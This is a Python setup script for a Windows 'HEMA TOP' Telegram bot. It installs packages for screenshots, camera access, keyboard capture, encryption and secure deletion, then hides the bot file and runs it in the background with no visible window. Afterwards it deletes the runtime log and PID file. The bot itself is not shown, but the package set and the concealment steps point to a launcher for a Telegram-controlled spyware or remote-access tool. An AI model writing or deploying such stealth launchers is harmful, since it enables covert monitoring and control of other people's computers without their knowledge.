
import os
import sys
import subprocess
import time
import logging
import win32file
import win32con
import ctypes
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_setup.log'),
        logging.StreamHandler()
    ]
)

def hide_file(file_path):
    try:
        # Convert to absolute path
        abs_path = os.path.abspath(file_path)
        # Hide the file
        win32file.SetFileAttributes(abs_path, win32con.FILE_ATTRIBUTE_HIDDEN)
        return True
    except Exception as e:
        logging.error(f"Failed to hide file: {e}")
        return False

def install_requirements():
    logging.info("Starting package installation...")
    packages = [
        'pyTelegramBotAPI',
        'Pillow',
        'mss',
        'opencv-python',
        'pyttsx3',
        'pyAesCrypt',
        'secure-delete',
        'keyboard',
        'pywin32',
        'psutil'  # Added for process management
    ]
    
    success_count = 0
    for package in packages:
        try:
            logging.info(f"Installing {package}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', package])
            success_count += 1
            logging.info(f"Successfully installed {package}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to install {package}: {e}")
            return False
    
    logging.info(f"Successfully installed {success_count}/{len(packages)} packages")
    return True

def run_bot():
    try:
        # Hide the main bot file
        hide_file('HEMA_TOP.py')
        
        # Hide the console window
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        # Create a log file for the bot
        with open('bot_runtime.log', 'a') as f:
            f.write(f"\n=== Bot started at {datetime.now()} ===\n")
        
        # Run the bot in the background
        process = subprocess.Popen(
            [sys.executable, 'HEMA_TOP.py'],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=open('bot_runtime.log', 'a'),
            stderr=open('bot_runtime.log', 'a')
        )
        
        # Save the process ID
        with open('bot.pid', 'w') as f:
            f.write(str(process.pid))
        
        logging.info(f"Bot started successfully in the background! (PID: {process.pid})")
        return True
    except Exception as e:
        logging.error(f"Error starting bot: {e}")
        return False

def cleanup():
    try:
        # Remove temporary files if they exist
        temp_files = ['bot.pid', 'bot_runtime.log']
        for file in temp_files:
            if os.path.exists(file):
                os.remove(file)
    except Exception as e:
        logging.error(f"Error during cleanup: {e}")

if __name__ == "__main__":
    try:
        print("🎯 HEMA TOP Bot Setup")
        print("=" * 50)
        
        if install_requirements():
            if run_bot():
                print("\n✅ Setup completed successfully!")
                print("Bot is now running in the background.")
                print("Use stop_bot.py to stop the bot when needed.")
            else:
                print("\n❌ Failed to start the bot!")
        else:
            print("\n❌ Failed to install requirements!")
        
        cleanup()
        
    except Exception as e:
        logging.error(f"Fatal error during setup: {e}")
        print(f"\n❌ An error occurred: {e}")
    finally:
        print("\nPress Enter to exit...")
        input() 
